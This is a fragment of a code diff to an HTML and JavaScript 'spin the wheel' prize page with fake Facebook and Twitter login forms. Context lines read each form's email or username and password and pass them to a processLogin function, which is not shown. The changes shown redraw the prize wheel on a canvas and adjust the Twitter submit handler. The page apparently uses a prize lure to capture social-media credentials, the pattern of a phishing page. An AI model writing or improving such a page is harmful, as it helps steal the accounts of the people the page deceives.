             const email = document.getElementById('fbEmail').value;
             const password = document.getElementById('fbPassword').value;
             
@@ -818,7 +1019,8 @@
             processLogin('facebook', `Email: ${email}, Password: ${password}`);
         });
         
-        twSubmit.addEventListener('click', () => {
+        twSubmit.addEventListener('click', (e) => {
+            e.preventDefault();
             const username = document.getElementById('twUsername').value;
             const password = document.getElementById('twPassword').value;
             
@@ -835,56 +1037,74 @@
         // Initialize the page
         initPrizesGrid();
         
-        // Simulate wheel image (using placeholder)
-        wheel.src = 'https://i.imgur.com/placeholder-wheel.png';
+        // Create wheel image
+        createWheelImage();
         
-        // Add a simple wheel if placeholder not available
-        setTimeout(() => {
-            if (wheel.naturalWidth === 0) {
-                // Create a simple wheel using canvas
-                const canvas = document.createElement('canvas');
-                canvas.width = 500;
-                canvas.height = 500;
-                const ctx = canvas.getContext('2d');
+        // Function to create wheel image
+        function createWheelImage() {
+            const canvas = document.createElement('canvas');
+            canvas.width = 500;
+            canvas.height = 500;
+            const ctx = canvas.getContext('2d');
+            
+            // Draw wheel background
+            const centerX = 250;
+            const centerY = 250;
+            const radius = 240;
+            
+            // Draw segments
+            const segmentAngle = (2 * Math.PI) / prizes.length;
+            
+            for (let i = 0; i < prizes.length; i++) {
+                const startAngle = i * segmentAngle;
+                const endAngle = (i + 1) * segmentAngle;
                 
-                // Draw wheel segments
-                const centerX = 250;
-                const centerY = 250;
-                const radius = 240;
-                
-                prizes.forEach((prize, index) => {
-                    const angle = (Math.PI * 2) / prizes.length;
-                    const startAngle = index * angle;
-                    const endAngle = (index + 1) * angle;
-                    
-                    // Alternate colors
-                    ctx.fillStyle = index % 2 === 0 ? '#8B0000' : '#B22222';
-                    ctx.beginPath();
-                    ctx.moveTo(centerX, centerY);
-                    ctx.arc(centerX, centerY, radius, startAngle, endAngle);
-                    ctx.closePath();
-                    ctx.fill();
-                    
-                    // Draw text
-                    ctx.save();
-                    ctx.translate(centerX, centerY);
-                    ctx.rotate(startAngle + angle / 2);
-                    ctx.textAlign = 'right';
-                    ctx.fillStyle = '#FFD700';
-                    ctx.font = 'bold 16px Arial';
-                    ctx.fillText(prize.name, radius - 20, 5);
-                    ctx.restore();
-                });
-                
-                // Draw center circle
-                ctx.fillStyle = '#0a0a2a';
+                // Alternate colors
+                ctx.fillStyle = i % 2 === 0 ? '#8B0000' : '#B22222';
                 ctx.beginPath();
-                ctx.arc(centerX, centerY, 50, 0, Math.PI * 2);
+                ctx.moveTo(centerX, centerY);
+                ctx.arc(centerX, centerY, radius, startAngle, endAngle);
+                ctx.closePath();
                 ctx.fill();
                 
-                wheel.src = canvas.toDataURL();
+                // Draw prize names
+                ctx.save();
+                ctx.translate(centerX, centerY);
+                ctx.rotate(startAngle + segmentAngle / 2);
+                ctx.textAlign = 'right';
+                ctx.fillStyle = '#FFD700';
+                ctx.font = 'bold 14px Arial';
+                ctx.fillText(prizes[i].name, radius - 30, 5);
+                ctx.restore();
             }
-        }, 100);
+            
+            // Draw outer border
+            ctx.strokeStyle = '#FFD700';
+            ctx.lineWidth = 5;
+            ctx.beginPath();
+            ctx.arc(centerX, centerY, radius, 0, 2 * Math.PI);
+            ctx.stroke();
+            
+            // Draw center circle
+            ctx.fillStyle = '#000';
+            ctx.beginPath();
+            ctx.arc(centerX, centerY, 50, 0, 2 * Math.PI);
+            ctx.fill();
+            ctx.strokeStyle = '#FFD700';
+            ctx.lineWidth = 5;
+            ctx.stroke();
+            
+            // Add SPIN text
+            ctx.fillStyle = '#FFD700';
+            ctx.font = 'bold 16px Arial';
+            ctx.textAlign = 'center';
+            ctx.textBaseline = 'middle';
+            ctx.fillText('SPIN', centerX, centerY - 10);
+            ctx.fillText('WHEEL', centerX, centerY + 10);
+            
+            // Set wheel image
+            wheel.src = canvas.toDataURL();
+        }
     </script>
 </body>
 </html>
